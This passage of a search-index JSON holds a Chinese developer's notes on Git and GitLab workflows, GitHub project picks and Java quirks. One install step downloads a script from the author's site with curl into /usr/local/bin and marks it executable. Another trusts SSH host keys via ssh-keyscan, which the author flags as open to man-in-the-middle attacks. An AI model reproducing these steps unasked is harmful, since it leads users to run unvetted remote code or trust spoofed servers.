gnupg / gpg - agent . conf default - cache - ttl 34560000 max - cache - ttl 34560000","title":"\u4fee\u6539gpg\u8981\u6c42\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u7684\u65f6\u95f4\u9650\u5236"},{"location":"Git/#gitlab-api","text":"\u8fd9\u91cc\u7684\u9700\u6c42\u662f\u5b9a\u65f6\u4efb\u52a1\u751f\u6210snapshot\u6587\u4ef6\uff0c\u6253\u7b97\u4f20\u81f3\u514d\u8d39\u5b58\u50a8\u4f5c\u4e3a\u5907\u4efd\uff0c\u4e0d\u60f3\u5360\u7528\u670d\u52a1\u5668\u786c\u76d8\u53bb\u5b58\u50a8\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4e5f\u4e0d\u60f3\u82b1\u94b1\u4e70\u5b58\u50a8\u670d\u52a1 \u4e8e\u662f\u60f3\u5230\u514d\u8d39\u7684gitlab.com\u7684\u79c1\u6709\u4ed3\u5e93\uff0c\u4ed3\u5e93\u6570\u91cf\u65e0\u9650\uff0c \u6bcf\u4e2arepo\u53ef\u4ee5\u5b5810GB \u4f7f\u7528API\u6765\u63d0\u4ea4\u53ef\u4ee5\u907f\u514d\u5360\u7528\u672c\u5730\u7a7a\u95f4 \u5176\u5b9e\u672c\u6765\u6253\u7b97\u7528github\u7684\uff0c\u4f46\u662fgithub\u4eca\u5929(20181022)\u6302\u4e86\uff0c\u4e8e\u662f\u5c31gitlab\u5427 \u627e\u5230\u8fd9\u4e2apython sdk: https://python-gitlab.readthedocs.io/ \u5199\u70b9\u4ee3\u7801\u54af\uff1a\u4e0a\u4f20\u5f53\u524d\u76ee\u5f55\u7684to_upload.jpg\u5230uploaded.jpg\uff0c\u8bb0\u5f97\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u8bbf\u95ee\u4ee4\u724c\u548c\u9879\u76eeID TOKEN = '...' # personal access token, https://gitlab.com/profile/personal_access_tokens REPO_ID = 123456 # after create project, you can see project ID in your repo homepage message = 'test commit' target_filename = 'uploaded.jpg' src_filename = 'to_upload.jpg' import gitlab import base64 gl = gitlab . Gitlab ( 'https://gitlab.com' , private_token = TOKEN ) gl . auth () p = gl . projects . get ( REPO_ID ) filecontent = open ( src_filename , 'rb' ) . read () data = { 'branch_name' : 'master' , 'branch' : 'master' , 'commit_message' : message , 'actions' :[{ 'action' : 'create' , 'file_path' : target_filename , 'content' : base64 . b64encode ( filecontent ) . decode (), 'encoding' : 'base64' }] } c = p . commits . create ( data ) print ( c )","title":"\u4f7f\u7528GitLab API\u5b58\u50a8\u6570\u636e\u5907\u4efd\u6587\u4ef6 \u4e0d\u5360\u7528\u672c\u5730\u7a7a\u95f4"},{"location":"Git/#gitgit-pull","text":"\u60c5\u666f\uff1a\u5ba2\u6237\u7aefA\u548cB\u4f7f\u7528gitlab\u670d\u52a1\u5668S\uff0c\u7136\u540e\u67d0\u5929S\u65e0\u6cd5\u8fde\u4e0a\u4e86\uff0c\u4f46A\u548cB\u4e4b\u95f4\u53ef\u4ee5\u76f4\u63a5\u901a\u8baf\u3002B\u4e0a\u5f00\u53d1\u4e86\u65b0\u4ee3\u7801\uff0c\u60f3\u8ba9A\u83b7\u53d6\u5230\u8fd9\u4e2a\u66f4\u65b0\uff0c\u5982\u4f55\u6700\u65b9\u4fbf\u7b80\u5355\u5730\u5728A\u4e0a\u540c\u6b65B\u4e0a\u7684\u4ee3\u7801\u66f4\u65b0\u5462\uff1f \u89e3\u51b3\u65b9\u6848\uff1a\u7528python\u5f00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7136\u540e\u6dfb\u52a0http\u7684remote\u8fdb\u884cpull\uff0c\u6ce8\u610f\u5148\u8981\u8ba9git\u89e3\u538bpack\u6587\u4ef6 git update-server-info python3 -m http.server 6666 git remote add tmp http://ip-b:6666/.git/ git pull tmp master \u95ee\u9898\u6765\u4e86\uff1a\u5982\u679cA\u8bbf\u95ee\u4e0d\u4e86B\u600e\u4e48\u529e\u5462\uff1f\u901a\u8fc7 git format-patch HEAD~2..HEAD --stdout>patchfile \u751f\u6210patch\u6587\u4ef6\u518d\u53d1\u8fc7\u53bb git am patchfile \uff0c\u4f46\u8fd9\u6837\u53ef\u80fd\u4f1a\u6539\u53d8commit id","title":"\u5728git\u670d\u52a1\u5668\u65e0\u6cd5\u8fde\u63a5\u65f6\u70b9\u5bf9\u70b9git pull"},{"location":"Git/#git_2","text":"\u5982\u4e8c\u8fdb\u5236\u7684\u4ed3\u5e93\u4e0d\u60f3\u4f7f\u7528\u538b\u7f29\uff0c\u53c2\u8003: https://stackoverflow.com/questions/11483288/how-to-disable-compression-in-git-server-side git config --add core.bigFileThreshold 1","title":"git\u7981\u7528\u538b\u7f29"},{"location":"Git/#githubssh-key-ghclone","text":"GitHub\u8981\u6c42\u4e0d\u540c\u4ed3\u5e93\u7684deploy key\u4e0d\u540c\uff0c\u4f46ssh config\u53ea\u80fd\u4e3a\u4e00\u4e2aHost\u8bbe\u7f6e\u76f8\u540c\u7684key \u4ece \u8fd9\u91cc \u53d1\u73b0\u4e86\u4e00\u4e2atrick\uff1a *.github.com \u90fd\u662f\u53ef\u4ee5\u6b63\u5e38\u89e3\u6790\u5230github\u7684\uff0c\u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u65e0\u6570\u4e2aHost \u5feb\u901f\u4f7f\u7528\uff1a curl https://d.py3.io/ghclone > /usr/local/bin/ghclone chmod +x /usr/local/bin/ghclone ghclone user/repo \u4f1a\u4e3a\u8fd9\u4e2arepo\u521b\u5efa\u4e00\u4e2assh key\u653e\u5728 ~/.ssh \u76ee\u5f55\u4e0b\uff0c\u540c\u65f6\u4fee\u6539 ~/.ssh/config \uff0c\u7136\u540e\u663e\u793a\u51fa\u516c\u94a5\uff0c\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230github\uff0c\u6700\u540e\u56de\u8f66\u5c31\u4f1a\u5f00\u59cbgit clone Done. \u5982\u679c\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u4ed3\u5e93\uff0c\u6700\u540e\u4e00\u6b65\u4e0d\u7528\u56de\u8f66Ctrl+C\u540e: git remote set-url origin git@{repo}.github.com:{user}/{repo}.git","title":"GitHub\u4e0d\u540c\u4ed3\u5e93\u4f7f\u7528\u4e0d\u540cssh key: ghclone"},{"location":"Git/#git_3","text":"\u573a\u666f\uff1a GitLab\u670d\u52a1\u5668\u5b95\u673a\u4e86\uff0c\u73b0\u5728\u9700\u8981\u540c\u6b65\u81ea\u5df1\u672c\u5730\u7684\u4fee\u6539\u5230\u670d\u52a1\u5668\u4e0a \u53c2\u8003\uff1a https://datagrok.org/git/git-serve/ # \u81ea\u5df1\u673a\u5668\u4e0a\uff08\u6709\u66f4\u591acommit\u7684\uff09 git config -- global alias . quickserve \"daemon --verbose --export-all --base-path=.git --reuseaddr --strict-paths .git/\" git quickserve # \u670d\u52a1\u5668\u4e0a\uff08\u9700\u8981pull\u5f97\u5230commit\u7684\uff09 git remote add temp git : // 192.168 . 1.123 / git pull temp master \u540c\u6b65\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5Ctrl+C\u5173\u95edgit\u670d\u52a1\u4e86 Note git\u672b\u5c3e\u7684/\u4e0d\u53ef\u7f3a\u7701\uff0c\u4e0d\u7136\u62a5\u9519fatal: No path specified. See \u2018man git-pull\u2019 for valid url syntax git pull\u7684\u5206\u652f\u540d\u79f0master\u4e5f\u4e0d\u80fd\u7701\u7565","title":"\u542f\u52a8\u4e00\u4e2a\u4e34\u65f6\u7684Git\u670d\u52a1\u5668 \u672c\u5730\u4e4b\u95f4\u540c\u6b65"},{"location":"Git/#githubstar","text":"\u81ea\u4eceGitHub\u88ab\u5fae\u8f6f\u6536\u8d2d\u540e\uff0c\u4f3c\u4e4e\u5c31\u5d29\u5f97\u66f4\u9891\u7e41\u4e86\uff0c\u4e3a\u4e86\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4ecd\u7136\u80fd\u8bfb\u4ee3\u7801\uff0c\u4e0d\u59a8\u8dd1\u4e00\u4e0b\u5b9a\u65f6\u811a\u672c\uff0c\u81ea\u52a8pull\u6307\u5b9a\u4ed3\u5e93push\u5230\u5176\u4ed6git\u670d\u52a1\u4e0a\uff08\u5982\u81ea\u884c\u90e8\u7f72gitea\uff09\u3002 \u83b7\u53d6\u81ea\u5df1star\u8fc7\u7684\u6240\u6709\u4ed3\u5e93\uff1a\uff08\u4f9d\u8d56 apt install -y jq \uff09 for i in ` seq 28 ` ; do curl \"https://api.github.com/users/zjuchenyuan/starred?page= ${ i } \" > ${ i } .tmp ; done cat *.tmp | jq '.[].full_name' -r > mystars.txt sync.sh: \u4ecegithub clone\u6216fetch\u5bf9\u5e94\u7684\u4ed3\u5e93\uff0c\u7136\u540epush\u5230\u81ea\u5df1\u7684git\u670d\u52a1\u4e0a\uff0c\u8fd9\u91cc\u4f7f\u7528bare\u907f\u514dcheckout\u5bfc\u81f4\u7684\u66f4\u591a\u7a7a\u95f4\u5360\u7528 TODO: \u6ce8\u610f\u5230\u4ecd\u7136\u662f\u53cc\u4efd\u7684\u7a7a\u95f4\u5360\u7528\uff08\u540c\u6b65\u548cgitea\u90fd\u5b58\u4e86\uff09\uff0c\u9700\u8981\u770b\u770b\u80fd\u4e0d\u80fd\u76f4\u63a5\u4ecegitea\u7684git\u5b58\u50a8\u53d1\u8d77fetch\u66f4\u65b0 #!/bin/bash u = ` echo ${ 1 } | cut -d/ -f1 ` n = ` echo ${ 1 } | cut -d/ -f2 ` if [ -z \" $u \" ] || [ -z \" $n \" ] ; then echo Usage: $0 user/reponame exit 1 fi if [ -d \" ${ u } _ ${ n } \" ] ; then cd \" ${ u } _ ${ n } \" git fetch --all git push --all sync else git clone https://github.com/ ${ u } / ${ n } \" ${ u } _ ${ n } \" --bare cd \" ${ u } _ ${ n } \" git fetch --all git remote add sync git@\u4f60\u7684git\u670d\u52a1\u5730\u5740:\u4f60\u7684\u7528\u6237\u540d/ ${ u } _ ${ n } .git git push --all sync fi cd ..","title":"\u5907\u4efdGitHub\u4e0a\u81ea\u5df1star\u8fc7\u7684\u4ed3\u5e93"},{"location":"Git/#git-clonepushsshyes","text":"mkdir -p ~/.ssh ssh-keyscan \u4f60\u7684git\u670d\u52a1\u5730\u5740 >> ~/.ssh/known_host Note \u8fd9\u4e2a\u65b9\u6848\u5e76\u4e0d\u5b89\u5168\uff0c\u5bb9\u6613\u906d\u53d7\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4f60\u5e94\u8be5\u4e8b\u5148\u5728\u5b89\u5168\u7684\u7f51\u7edc\u4e0b\u83b7\u53d6\u6b63\u786e\u7684ssh key\u540e\u76f4\u63a5\u5c06\u6307\u7eb9\u5199\u5165known_host\u3002 \u4e0d\u8fc7\u5c31\u7b97\u4e0d\u81ea\u52a8\u5316\u4f60\u4e5f\u4f1a\u81ea\u5df1\u56de\u7b54yes\uff0c\u672c\u8d28\u4e0a\u4e00\u6837hhh","title":"git clone\u548cpush\u907f\u514d\u8f93\u5165ssh\u8be2\u95ee\u7684yes"},{"location":"Git/#gitea","text":"https://hub.docker.com/r/gitea/gitea \u6309\u7167\u5b98\u65b9\u7ed9\u51fa\u7684docker-compose\u90e8\u7f72\u5373\u53ef\uff0c\u5b89\u88c5\u65f6\u9700\u8981\u7559\u5fc3\uff1asmtp\u7684host\u9700\u8981\u5305\u542b\u7aef\u53e3\uff0c\u767b\u5f55\u7528\u6237\u540d\u662f\u5b8c\u6574\u7684\u90ae\u7bb1 \u7136\u540e\u9700\u8981\u4fee\u6539\u914d\u7f6e\uff0c\u5141\u8bb8\u7528\u6237\u5728push\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u4ed3\u5e93\u65f6\u81ea\u52a8\u521b\u5efa\uff0c\u53c2\u89c1 \u8fd9\u4e2aissue \u548c conf\u914d\u7f6e\u6587\u6863 \u9700\u8981\u5728app.ini\u7684 [repository] \u4e00\u8282\u4e2d\u52a0\u5165\uff1a ENABLE_PUSH_CREATE_USER = true ENABLE_PUSH_CREATE_ORG = true \u5c0f\u5fc3git bomb \u5b9e\u9645\u6d4b\u8bd5\u53d1\u73b0 \u5bf9 git bomb \u8fd9\u79cd\u4ed3\u5e93 checkout\u5c31\u4f1a\u5360\u6ee1\u5168\u90e8\u5185\u5b58 \u5373\u4f7f\u4f7f\u7528\u4e0a\u8ff0\u811a\u672c\u53ea\u540c\u6b65bare\u4ed3\u5e93\uff0cgitea\u4f1a\u542f\u52a8git show\u547d\u4ee4\uff0c\u4ecd\u7136\u4f1a\u70b8\u5185\u5b58\uff08\u4f46\u4f3c\u4e4ekill\u6389\u8fd9\u4e2a\u547d\u4ee4\u540e\u7f51\u9875\u663e\u793a\u4e5f\u662f\u6b63\u5e38\u7684\uff09","title":"\u90e8\u7f72gitea"},{"location":"Git/#gitcommit","text":"https://stackoverflow.com/questions/3814926/git-commit-date \u83b7\u53d6\u65f6\u95f4\u6233\uff1a git show -s --format=%ct COMMIT_ID","title":"Git\u67e5\u8be2\u7279\u5b9acommit\u65f6\u95f4"},{"location":"Git/#githubreleases","text":"https://docs.github.com/en/rest/reference/repos#releases https://api.github.com/repos/octocat/hello-world/releases?per_page=100&page=1","title":"GitHub\u67e5\u8be2\u6240\u6709releases"},{"location":"Git/#git-diff","text":"\u53c2\u8003\uff1a https://stackoverflow.com/questions/8259851/using-git-diff-how-can-i-get-added-and-modified-lines-numbers diff-lines() { local path= local line= while read; do esc=$'\\033' if [[ $REPLY =~ ---\\ (a/)?.* ]]; then continue elif [[ $REPLY =~ \\+\\+\\+\\ (b/)?([^[:blank:] $esc ]+).* ]]; then path= ${ BASH_REMATCH [ 2 ] } elif [[ $REPLY =~ @@\\ -[0-9]+(,[0-9]+)?\\ \\+([0-9]+)(,[0-9]+)?\\ @@.* ]]; then line= ${ BASH_REMATCH [ 2 ] } elif [[ $REPLY =~ ^( $esc \\[[0-9;]+m)*([\\ +-]) ]]; then echo \" $path : $line : $REPLY \" if [[ ${ BASH_REMATCH [ 2 ] } != - ]]; then ((line++)) fi fi done } \u7528\u6cd5\uff1a git diff commit^ commit -U0|diff-lines","title":"git diff\u663e\u793a\u4fee\u6539\u540e\u884c\u53f7"},{"location":"GithubProjectRecommendation/","text":"you-get \u00b6 https://github.com/soimort/you-get pip\u5b89\u88c5\u540e\u76f4\u63a5\u4e0b\u8f7db\u7ad9\u8d85\u6e05\u89c6\u9891 \u672c\u60f3\u81ea\u5df1\u7528PhantomJS\u5199bilibili\u7684\u4e0b\u8f7d\u7684\uff0c\u6ca1\u60f3\u5230\u4eba\u5bb6\u62ff\u5230\u4e86\u7b7e\u540d\u7684\u79c1\u94a5\uff0c\u76f4\u63a5\u514d\u6d4f\u89c8\u5668\u5b9e\u73b0\u4e86666 Anki \u00b6 https://github.com/dae/anki Anki\u662f\u4e00\u4e2a\u8f85\u52a9\u8bb0\u5fc6\u8f6f\u4ef6\uff0c\u5b83\u53ef\u4ee5\u5728\u76f8\u5bf9\u5408\u9002\u7684\u65f6\u95f4\u6765\u544a\u8bc9\u4f60\u590d\u4e60\u4ec0\u4e48\u6bd4\u8f83\u597d\u3002 Learn More: https://zhuanlan.zhihu.com/p/21338255?refer=-anki https://zhuanlan.zhihu.com/-anki OnlineJudge \u00b6 https://github.com/QingdaoU/OnlineJudge \u9752\u5c9b\u5927\u5b66\u7684OnlineJudge\uff0c\u4eba\u5bb6\u7684\u6bd5\u4e1a\u8bbe\u8ba1\u5462\uff0c\u754c\u9762\u597d\u770b\uff0c\u57fa\u4e8eDocker\uff0cC\u548cJava\u7684\u6c99\u7bb1\u8bbe\u8ba1\u633a\u5b8c\u5584\u7684 https://github.com/QingdaoU/OnlineJudge/wiki/%E6%AD%A3%E5%BC%8F%E9%83%A8%E7%BD%B2%E6%96%87%E6%A1%A3 \u8fd9\u662f\u5b89\u88c5\u6587\u6863\uff0c\u9700\u8981\u5b89\u88c5Docker\u548cdocker-compose\uff0c\u6ce8\u610f\u5176\u4e2dpython tools/release_static.py\u8fd9\u4e00\u6b65\u662f\u5fc5\u987b\u6267\u884c\u7684 \u5b89\u88c5\u540e\u7684\u9ed8\u8ba4\u7248\u672c\u662f\u4e0d\u652f\u6301Python\u4f5c\u4e3a\u63d0\u4ea4\u8bed\u8a00\u7684\uff0c\u9700\u8981\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a # \u9996\u5148\u5173\u6389\u5bb9\u5668 docker - compose stop # \u5728master\u5206\u652f\u628a\u90a3\u4e2a\u5206\u652fmerge\u8fc7\u6765 git merge origin / python - support python tools / release_static . py # \u7136\u540e\u542f\u52a8\u5bb9\u5668\uff0c\u6ce8\u610f\u8981-d\u5426\u5219\u4f1a\u5360\u636e\u524d\u53f0 docker - compose up - d sympy \u00b6 https://github.com/sympy/sympy http://docs.sympy.org/latest/tutorial/solvers.html Python\u4e5f\u80fd\u7528\u6765\u89e3\u65b9\u7a0b\uff01\u6c42\u6781\u9650\uff01\u6c42\u79ef\u5206\uff01 shellcheck \u00b6 \u68c0\u67e5\u81ea\u5df1\u5199\u7684shell\u811a\u672c\u6709\u6ca1\u6709\u95ee\u9898 https://github.com/koalaman/shellcheck https://www.shellcheck.net/ InstantClick \u00b6 https://github.com/dieulot/instantclick \u5728\u9f20\u6807\u60ac\u505c\u65f6\u5373\u523b\u5f00\u59cb\u52a0\u8f7d\u7f51\u9875\uff0c\u663e\u8457\u63d0\u9ad8\u7f51\u9875\u52a0\u8f7d\u901f\u5ea6\uff0c\u975e\u5e38\u9002\u5408\u9759\u6001blog\u7c7b\u578b\u7f51\u9875\u4f7f\u7528 explainshell \u00b6 https://github.com/idank/explainshell \u67e5\u8be2shell\u547d\u4ee4\u5404\u4e2a\u53c2\u6570\u7684\u542b\u4e49 Python Learn Notes \u00b6 https://github.com/AnyISalIn/Python_Learn_Notes \u4e00\u4e9b\u4e0d\u9519\u7684Python\u7b14\u8bb0 websocketd \u00b6 https://github.com/joewalnes/websocketd/ \u628alinux\u7a0b\u5e8f\u7684\u8f93\u51fa\u8f93\u51fa\u91cd\u5b9a\u5411\u5230websocket\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7f51\u9875\u4e0a\u5b9e\u65f6\u663e\u793a\u7a0b\u5e8f\u6267\u884c\u52a8\u6001\uff0c\u5b98\u7f51\uff1a http://websocketd.com/","title":"Github Project Recommendation"},{"location":"GithubProjectRecommendation/#you-get","text":"https://github.com/soimort/you-get pip\u5b89\u88c5\u540e\u76f4\u63a5\u4e0b\u8f7db\u7ad9\u8d85\u6e05\u89c6\u9891 \u672c\u60f3\u81ea\u5df1\u7528PhantomJS\u5199bilibili\u7684\u4e0b\u8f7d\u7684\uff0c\u6ca1\u60f3\u5230\u4eba\u5bb6\u62ff\u5230\u4e86\u7b7e\u540d\u7684\u79c1\u94a5\uff0c\u76f4\u63a5\u514d\u6d4f\u89c8\u5668\u5b9e\u73b0\u4e86666","title":"you-get"},{"location":"GithubProjectRecommendation/#anki","text":"https://github.com/dae/anki Anki\u662f\u4e00\u4e2a\u8f85\u52a9\u8bb0\u5fc6\u8f6f\u4ef6\uff0c\u5b83\u53ef\u4ee5\u5728\u76f8\u5bf9\u5408\u9002\u7684\u65f6\u95f4\u6765\u544a\u8bc9\u4f60\u590d\u4e60\u4ec0\u4e48\u6bd4\u8f83\u597d\u3002 Learn More: https://zhuanlan.zhihu.com/p/21338255?refer=-anki https://zhuanlan.zhihu.com/-anki","title":"Anki"},{"location":"GithubProjectRecommendation/#onlinejudge","text":"https://github.com/QingdaoU/OnlineJudge \u9752\u5c9b\u5927\u5b66\u7684OnlineJudge\uff0c\u4eba\u5bb6\u7684\u6bd5\u4e1a\u8bbe\u8ba1\u5462\uff0c\u754c\u9762\u597d\u770b\uff0c\u57fa\u4e8eDocker\uff0cC\u548cJava\u7684\u6c99\u7bb1\u8bbe\u8ba1\u633a\u5b8c\u5584\u7684 https://github.com/QingdaoU/OnlineJudge/wiki/%E6%AD%A3%E5%BC%8F%E9%83%A8%E7%BD%B2%E6%96%87%E6%A1%A3 \u8fd9\u662f\u5b89\u88c5\u6587\u6863\uff0c\u9700\u8981\u5b89\u88c5Docker\u548cdocker-compose\uff0c\u6ce8\u610f\u5176\u4e2dpython tools/release_static.py\u8fd9\u4e00\u6b65\u662f\u5fc5\u987b\u6267\u884c\u7684 \u5b89\u88c5\u540e\u7684\u9ed8\u8ba4\u7248\u672c\u662f\u4e0d\u652f\u6301Python\u4f5c\u4e3a\u63d0\u4ea4\u8bed\u8a00\u7684\uff0c\u9700\u8981\u8fdb\u884c\u5982\u4e0b\u64cd\u4f5c\uff1a # \u9996\u5148\u5173\u6389\u5bb9\u5668 docker - compose stop # \u5728master\u5206\u652f\u628a\u90a3\u4e2a\u5206\u652fmerge\u8fc7\u6765 git merge origin / python - support python tools / release_static . py # \u7136\u540e\u542f\u52a8\u5bb9\u5668\uff0c\u6ce8\u610f\u8981-d\u5426\u5219\u4f1a\u5360\u636e\u524d\u53f0 docker - compose up - d","title":"OnlineJudge"},{"location":"GithubProjectRecommendation/#sympy","text":"https://github.com/sympy/sympy http://docs.sympy.org/latest/tutorial/solvers.html Python\u4e5f\u80fd\u7528\u6765\u89e3\u65b9\u7a0b\uff01\u6c42\u6781\u9650\uff01\u6c42\u79ef\u5206\uff01","title":"sympy"},{"location":"GithubProjectRecommendation/#shellcheck","text":"\u68c0\u67e5\u81ea\u5df1\u5199\u7684shell\u811a\u672c\u6709\u6ca1\u6709\u95ee\u9898 https://github.com/koalaman/shellcheck https://www.shellcheck.net/","title":"shellcheck"},{"location":"GithubProjectRecommendation/#instantclick","text":"https://github.com/dieulot/instantclick \u5728\u9f20\u6807\u60ac\u505c\u65f6\u5373\u523b\u5f00\u59cb\u52a0\u8f7d\u7f51\u9875\uff0c\u663e\u8457\u63d0\u9ad8\u7f51\u9875\u52a0\u8f7d\u901f\u5ea6\uff0c\u975e\u5e38\u9002\u5408\u9759\u6001blog\u7c7b\u578b\u7f51\u9875\u4f7f\u7528","title":"InstantClick"},{"location":"GithubProjectRecommendation/#explainshell","text":"https://github.com/idank/explainshell \u67e5\u8be2shell\u547d\u4ee4\u5404\u4e2a\u53c2\u6570\u7684\u542b\u4e49","title":"explainshell"},{"location":"GithubProjectRecommendation/#python-learn-notes","text":"https://github.com/AnyISalIn/Python_Learn_Notes \u4e00\u4e9b\u4e0d\u9519\u7684Python\u7b14\u8bb0","title":"Python Learn Notes"},{"location":"GithubProjectRecommendation/#websocketd","text":"https://github.com/joewalnes/websocketd/ \u628alinux\u7a0b\u5e8f\u7684\u8f93\u51fa\u8f93\u51fa\u91cd\u5b9a\u5411\u5230websocket\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7f51\u9875\u4e0a\u5b9e\u65f6\u663e\u793a\u7a0b\u5e8f\u6267\u884c\u52a8\u6001\uff0c\u5b98\u7f51\uff1a http://websocketd.com/","title":"websocketd"},{"location":"Java/","text":"Java\u7684\u795e\u5947(keng) \u00b6 \u8bb0\u5f55\u4e00\u4e0bJava\u4e0eC\u7684\u4e0d\u540c\u70b9\uff0c\u611f\u53d7Thinking in Java \u53d8\u91cf\u540d\u79f0 \u00b6 $\u5c31\u662f\u4e2a\u666e\u901a\u5b57\u7b26\uff0c\u53ef\u4ee5int $a; //php\u8868\u793amdzz main\u51fd\u6570 \u00b6 \u5fc5\u987b\u662fpublic static void main(String[] args) \u5982\u679c\u6ca1\u6709static\uff0c\u7f16\u8bd1\u80fd\u901a\u8fc7\u4f46\u6ca1\u6709\u6267\u884c\u7ed3\u679c\uff1f// \u5f85\u8003\u8bc1\uff0ceclipse\u62d2\u7edd\u8fd0\u884c if \u00b6 if\u4e2d\u7684\u4e1c\u897f\u5fc5\u987b\u662fboolean\u7c7b\u578b\u7684\u503c\uff0c\u4e0d\u80fd\u628aint\u653e\u5165if\u4e2d if ( a = true )\u7684\u5751\u8fd8\u662f\u5b58\u5728\u7684\uff0c\u5141\u8bb8\u8d4b\u503c\u4f5c\u4e3aif\u6761\u4ef6 %\u53d6\u4f59\u7684\u7ed3\u679c \u00b6 \u8981\u8003\u8651\u5230\u8d1f\u6570\u7684\u7ed3\u679c\u554a~\uff08\u548cC\u4e00\u81f4\uff09 \u6570\u7ec4\u58f0\u660e\u5f15\u7528\u3001\u521d\u59cb\u5316\u4e4b\u540e\u624d\u80fd\u7528 \u00b6 \u4e0d\u5141\u8bb8int a[5]; \u53ea\u80fdint[] a = new int [5]; \u5982\u679c\u8981\u521d\u59cb\u5316 int[] b = new int[]{1,2}; \u53ef\u4ee5\u7b80\u5316\u4e3a int c[] = {1,2}; \u4f46\u4e0d\u80fd\u51fa\u73b0d={1,2}; \u4e0d\u5141\u8bb8\u5927\u62ec\u53f7\u8fd9\u73a9\u610f\u7528\u6765\u8d4b\u503c\uff0c\u53ea\u51c6\u7528\u4e8e\u521d\u59cb\u5316 switch \u00b6 boolean\u662f\u4e0d\u884c\u7684\uff1bString\u662f\u53ef\u4ee5\u7684\uff01 case\u662f\u4e0d\u80fd\u91cd\u590d\u7684\uff08\u548cC\u4e00\u81f4\uff09 == \u00b6 \u4e00\u5b9a\u662f\u6bd4\u8f83\u5730\u5740\uff0c\u5982\u679c\u201dhaha\u201d\u5728\u4ee3\u7801\u4e2d\u51fa\u73b0\u4e24\u6b21\uff0c\u4ed6\u4eec\u7684\u5730\u5740\u662f\u4e00\u6837\u7684 \u7c7b\u578b\u81ea\u52a8\u63d0\u5347 \u00b6 int long float double \u6700\u9ad8\u51fa\u73b0\u54ea\u4e2a\u5168\u90e8\u63d0\u5347\u4e3a\u54ea\u4e2a\uff0c\u90fd\u6ca1\u6709\u5c31\u5168\u90e8\u63d0\u5347\u4e3aint \u6240\u4ee5\u8981\u8fd9\u4e48\u5199\u624d\u80fd\u628abyte 2\uff1abyte b = (byte)(a 2); \u5185\u90e8\u7c7b \u00b6 \u52a0\u4e0astatic\u540e\uff1a\u53ef\u4ee5\u4e0d\u7528\u5b9e\u4f8b\u5316\u5916\u90e8\u7c7b\u5c31\u521b\u5efa\u5bf9\u8c61\uff0c\u4e0d\u80fd\u8bbf\u95ee\u5916\u90e8\u7c7b\u975e\u9759\u6001\u7684\u6570\u636e \u4e0d\u52a0static\uff1a\u9700\u8981\u5148\u5b9e\u4f8b\u5316\u5916\u90e8\u7c7bnew OuterClass().new InnerClass() \u6570\u7ec4\u7684new\u4e0d\u521b\u5efa\u5bf9\u8c61 \u00b6 \u5bf9\u8c61\u6570\u7ec4\u7684new\u662f\u4e0d\u4f1a\u521b\u5efa\u5bf9\u8c61\u7684 \u4f8b\u5982 A[] a=new A[5]; \u5e76\u4e0d\u4f1a\u521b\u5efa5\u4e2aA\u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u53ea\u662f5\u4e2a\u7a7a\u5f15\u7528 \u5f02\u5e38\u5904\u7406\u4e2d\u7684\u8d44\u6e90\u91ca\u653e\u95ee\u9898 \u00b6 From: http://stackoverflow.com/questions/8080649/do-i-have-to-close-fileoutputstream-which-is-wrapped-by-printstream \u5728Java7\u4e2d\u5f15\u5165\u4e86ARM(\u81ea\u52a8\u8d44\u6e90\u7ba1\u7406)\uff0c\u5e76\u4e0d\u9700\u8981\u624b\u52a8\u91ca\u653e\u8d44\u6e90 \u4ee5\u4e0b\u8fd9\u79cd\u628a\u53d8\u91cf\u58f0\u660e\u653e\u5230try\u540e\u7684\u62ec\u53f7\u91cc\u9762\uff0c\u4e0d\u5bf9\u8d44\u6e90\u624b\u52a8\u91ca\u653e\u7684\u5199\u6cd5\u662f\u53ef\u4ee5\u7684\uff0c\u6ca1\u6709\u4efb\u4f55\u9519\u8bef public static void main(String args[]) throws IOException { try (PrintStream ps = new PrintStream(new FileOutputStream(\"myfile.txt\"))) { ps.println(\"This data is written to a file:\"); System.out.println(\"Write successfully\"); } catch (IOException e) { System.err.println(\"Error in writing to file\"); throw e; } } \u666e\u901a\u7684try-catch\u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u5728finally\u4e2d\u91ca\u653e\u8d44\u6e90\uff1a public static void main ( String args [] ) throws IOException { PrintStream ps = null ; try { ps = new PrintStream(new FileOutputStream(\"myfile.txt\")) ; ps.println(\"This data is written to a file : \"); System.out.println(\" Write successfully \"); } catch (IOException e) { System.err.println(\" Error in writing to file \" ); throw e ; } finally { if (ps != null) ps.close() ; } } JVM\u542f\u52a8\u65f6\u7684\u5185\u5b58\u53c2\u6570 \u00b6 From: http://blog.chinaunix.net/uid-26863299-id-3559878.html \u5e38\u89c1\u53c2\u6570\u79cd\u7c7b\uff1a\u914d\u7f6e\u5806\u533a\u7684\uff08-Xms \u3001-Xmx\u3001-XX:newSize\u3001-XX:MaxnewSize\u3001-Xmn\uff09\u3001\u914d\u7f6e\u975e\u5806\u533a\uff08-XX:PermSize\u3001-XX:MaxPermSize\uff09\u3002 \u5806\u533a\u7684\uff1a 1\u3001-Xms \uff1a\u8868\u793ajava\u865a\u62df\u673a\u5806\u533a\u5185\u5b58\u521d\u59cb\u5185\u5b58\u5206\u914d\u7684\u5927\u5c0f 2\u3001-Xmx\uff1a \u8868\u793ajava\u865a\u62df\u673a\u5806\u533a\u5185\u5b58\u53ef\u88ab\u5206\u914d\u7684\u6700\u5927\u4e0a\u9650\uff0c\u901a\u5e38\u4f1a\u5c06 -Xms \u4e0e 